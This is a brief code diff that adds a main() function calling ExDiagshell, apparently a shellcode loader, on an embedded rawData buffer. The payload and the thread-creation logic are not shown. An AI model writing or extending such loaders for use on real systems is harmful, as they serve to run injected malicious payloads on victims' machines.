@@ -17,3 +17,9 @@ BOOL ExDiagshell(const unsigned char* shellcode, size_t shellcodeSize) {
 	CloseHandle(hThread);
 	return TRUE;
 }
+int main() {
+	if (!ExDiagshell(rawData, rawDataSize)) {
+		return 1;
+	}
+	return 0;
+}
